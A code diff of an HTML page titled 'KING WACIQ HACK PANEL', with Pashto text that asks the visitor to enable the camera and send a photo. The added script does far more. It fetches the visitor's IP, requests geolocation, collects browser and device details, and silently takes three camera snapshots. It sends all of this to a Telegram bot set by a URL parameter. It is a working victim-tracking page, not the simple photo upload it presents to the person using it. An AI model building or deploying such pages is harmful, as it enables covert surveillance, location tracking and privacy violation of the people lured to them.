@@ -1,43 +1,149 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Camera Snapshot to Bot</title>
+  <meta charset="UTF-8">
+  <title>KING WACIQ HACK PANEL</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      color: #0f0;
+      font-family: 'Orbitron', monospace;
+      text-align: center;
+    }
+    h1 {
+      margin-top: 40px;
+      font-size: 3em;
+      animation: glow 2s infinite alternate;
+    }
+    h2 {
+      font-size: 1.5em;
+      margin-top: 20px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 30px;
+      font-size: 16px;
+      border: 2px solid #0f0;
+      background: transparent;
+      color: #0f0;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0f0;
+      color: #000;
+    }
+    video {
+      margin-top: 30px;
+      border: 2px solid #0f0;
+      border-radius: 10px;
+    }
+    @keyframes glow {
+      from { text-shadow: 0 0 5px #0f0; }
+      to { text-shadow: 0 0 20px #0f0, 0 0 30px #0f0; }
+    }
+    canvas {
+      display: none;
+    }
+  </style>
 </head>
 <body>
+  <h1>KING WACIQ</h1>
   <h2>📸 کیمره فعاله کړه او عکس ولیږه</h2>
-  <video id="video" autoplay playsinline style="border:1px solid #ccc;"></video><br>
+  <video id="video" autoplay playsinline width="320" height="240"></video><br>
   <button id="snap">عکس واخله</button>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <canvas id="canvas"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
     const snap = document.getElementById('snap');
     const params = new URLSearchParams(window.location.search);
-    const uid = params.get('uid');
+    const chat_id = params.get('uid');
+    const bot_token = 'YOUR_BOT_TOKEN'; // <-- Replace with your real Telegram bot token
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => video.srcObject = stream)
-      .catch(_ => alert("❌ کیمرې اجازه مه‌شوه"));
+    if (!chat_id) {
+      alert("❌ UID نه‌دی ورکړل شوی");
+      throw new Error("UID missing");
+    }
 
-    snap.onclick = async () => {
-      if (!uid) {
-        alert("❌ UID ندی میسر!");
-        return;
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Unknown";
       }
-      const ctx = canvas.getContext('2d');
+    }
+
+    async function getLocation() {
+      return new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const { latitude, longitude } = pos.coords;
+            resolve(`📍 <b>Location:</b> https://maps.google.com/?q=${latitude},${longitude}`);
+          },
+          () => resolve("📍 <b>Location:</b> Not Allowed")
+        );
+      });
+    }
+
+    async function getDeviceInfo(ip, locationText) {
+      return `
+<b>📱 Device Info</b>
+🌐 <b>Browser:</b> ${navigator.userAgent}
+🖥️ <b>Platform:</b> ${navigator.platform}
+📏 <b>Screen:</b> ${screen.width} x ${screen.height}
+🗣️ <b>Language:</b> ${navigator.language}
+🌍 <b>IP Address:</b> ${ip}
+${locationText}
+`;
+    }
+
+    async function sendToTelegram(blob, caption) {
+      const form = new FormData();
+      form.append("chat_id", chat_id);
+      form.append("photo", blob, "snapshot.png");
+      form.append("caption", caption);
+      form.append("parse_mode", "HTML");
+
+      await fetch(`https://api.telegram.org/bot${bot_token}/sendPhoto`, {
+        method: "POST",
+        body: form
+      });
+    }
+
+    async function captureAndSend(index, caption) {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0);
+      const blob = await (await fetch(canvas.toDataURL('image/png'))).blob();
+      await sendToTelegram(blob, caption + `\n📸 <b>Snapshot #${index}</b>`);
+    }
 
-      const imageData = canvas.toDataURL('image/png');
-      await fetch('/api/upload', {
-        method: 'POST',
-        body: JSON.stringify({ image: imageData, uid }),
-        headers: { 'Content-Type': 'application/json' }
-      });
-      alert("✅ عکس مو بوت ته واستول شو");
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => video.srcObject = stream)
+      .catch(() => alert("❌ کیمرې ته اجازه ورنه‌شوه"));
+
+    snap.onclick = async () => {
+      snap.disabled = true;
+      snap.innerText = "✅ درحال لیږل...";
+
+      const ip = await getIP();
+      const locationText = await getLocation();
+      const caption = await getDeviceInfo(ip, locationText);
+
+      for (let i = 1; i <= 3; i++) {
+        await captureAndSend(i, caption);
+        await new Promise(r => setTimeout(r, 1000));
+      }
+
+      snap.innerText = "✅ لیږل بشپړ شول";
     };
   </script>
 </body>
